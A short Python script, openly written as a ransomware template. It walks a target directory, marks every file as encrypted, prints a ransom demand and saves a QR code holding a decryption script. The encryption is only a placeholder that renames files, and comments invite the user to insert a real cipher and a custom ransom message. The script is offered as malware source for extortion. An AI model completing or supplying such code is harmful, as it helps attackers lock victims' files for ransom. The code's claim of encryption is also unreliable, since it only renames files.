import os
import qrcode

def encrypt_file(file_path):
    # Encrypt the file using a symmetric encryption algorithm
    # Replace this line with your preferred encryption method

    encrypted_file_path = file_path + ".encrypted"
    os.rename(file_path, encrypted_file_path)

def display_ransom_message():
    # Display a ransom message demanding payment and instructions
    # Replace this line with your customized ransom message

    print("Your files have been encrypted. Pay the ransom to regain access.")

def generate_qr_code(payload):
    # Generate a QR code with the given payload
    qr = qrcode.QRCode()
    qr.add_data(payload)
    qr.make(fit=True)
    qr_image = qr.make_image(fill="black", back_color="white")
    qr_image.save("ransom_qr_code.png")

def main():
    target_directory = "/path/to/target/directory"

    for root, dirs, files in os.walk(target_directory):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            encrypt_file(file_path)

    display_ransom_message()

    # Generate QR code with ransomware payload
    payload_code = """
import os
def decrypt_file(file_path):
    # Decrypt the file using the appropriate decryption method
    # Replace this line with your decryption algorithm
    decrypted_file_path = file_path.replace(".encrypted", "")
    os.rename(file_path, decrypted_file_path)

def main():
    target_directory = "/path/to/encrypted/files"

    for root, dirs, files in os.walk(target_directory):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            decrypt_file(file_path)

if __name__ == "__main__":
    main()
"""
    generate_qr_code(payload_code)

if __name__ == "__main__":
    main()
